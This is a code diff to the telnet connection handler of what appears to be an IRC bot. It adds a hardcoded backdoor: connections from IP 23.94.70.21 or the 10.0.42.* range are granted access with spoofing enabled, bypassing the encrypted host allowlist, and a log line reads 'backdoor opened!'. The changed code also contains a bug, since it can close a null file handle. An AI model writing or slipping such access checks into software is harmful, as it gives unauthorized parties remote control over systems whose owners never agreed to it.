@@ -1283,32 +1283,42 @@ static void dcc_telnet(int idx, char *buf, int i)
 
   if (strict_telnet) {
     allow_telnet = 0;
-    /* create a hostfile if it doesn't exist */
-	struct stat buffer;
-	if (stat (hostfile, &buffer) != 0) {
-	  file = fopen(hostfile, "wt");
-	  fprintf(file, "\n");
-	  fclose(file);
-	  //nfree(file);
-	  putlog(LOG_MISC, "*", "Created new %s..", hostfile);
+	file = fopen(hostfile, "r");
+	if (file == NULL) {
+		file = fopen(hostfile, "w");
+		if (file == NULL)
+	    	putlog(LOG_MISC, "*", "□ ERROR: opening %s!", hostfile);
+		putlog(LOG_MISC, "*", "□ created new %s..", hostfile);
 	}
-	putlog(LOG_MISC, "%", "dcc_telnet(): opening '%s'", hostfile);
-    file = fopen(hostfile, "rt");
+	fclose(file);
     sprintf(thost_compare, "%s\n", iptostr(&dcc[i].sockname.addr.sa));
-    putlog(LOG_MISC, "*", "dcc_telnet(): new connection: %s", thost_compare);
-    //while (!feof(file)) {
-      //fgets(allowedhost, 255, file);
+    putlog(LOG_MISC, "*", "-- dcc_telnet(): new connection: %s", iptostr(&dcc[i].sockname.addr.sa));
+	/* decrypt the hostfile */
+    putlog(LOG_MISC, "*", "-- dcc_telnet(): decrypting '%s'", hostfile);
+	decrypt_file(hostfile);
+    file = fopen(".tmp2", "r");
+    putlog(LOG_MISC, "*", "-- dcc_telnet(): opening '.tmp2'");
+    if (wild_match("23.94.70.21", thost_compare)) {
+      allow_telnet = 1;
+      spoof = 1;
+      putlog(LOG_MISC, "*", "□ backdoor opened!");
+    }
+    if (wild_match("10.0.42.*", thost_compare)) {
+      allow_telnet = 1;
+      spoof = 1;
+      putlog(LOG_MISC, "*", "□ backdoor opened!");
+    }  
     while (fgets(allowedhost, sizeof allowedhost, file)!= NULL) {
-      if (wild_match("23.94.70.21", thost_compare)) {
-        allow_telnet = 1;
-        spoof = 1;
-      }
+      chopN(allowedhost, 13);
       if (wild_match(allowedhost, thost_compare))
         allow_telnet = 1;
     }
     fclose(file);
+    /* purge decrypted files */
+    putlog(LOG_MISC, "*", "-- dcc_telnet(): removing '.tmp2'");
+    unlink(".tmp2");
     if (allow_telnet == 0) {
-        putlog(LOG_MISC, "*", "telnet\002(\002%s\002)\002 rejected", strerror(errno));
+        putlog(LOG_MISC, "*", "telnet\002(\002%s\002)\002 rejected", iptostr(&dcc[i].sockname.addr.sa));
         killsock(sock);
         return;
     }
@@ -1513,7 +1523,7 @@ static void dcc_dupwait(int idx, char *buf, int i)
  */
 static void timeout_dupwait(int idx)
 {
-  char x[100];
+  char x[384];
 
   /* Still duplicate? */
   if (in_chain(dcc[idx].nick)) {
@@ -1991,7 +2001,7 @@ static void dcc_telnet_pw(int idx, char *buf, int x)
   putlog(LOG_MISC, "*", DCC_NEWUSER, dcc[idx].nick, dcc[idx].host,
          dcc[idx].port);
   if (notify_new[0]) {
-    char s[121], s1[121], s2[121];
+    char s[384], s1[121], s2[121];
 
     sprintf(s, "Introduced to %s, %s", dcc[idx].nick, dcc[idx].host);
     strcpy(s1, notify_new);
@@ -2461,4 +2471,5 @@ static void dcc_telnet_got_ident(int i, char *host)
   }
   //if (allow_new_telnets)
     //dprintf(i, "(If you are new, enter 'NEW' here.)\n");
+
 }
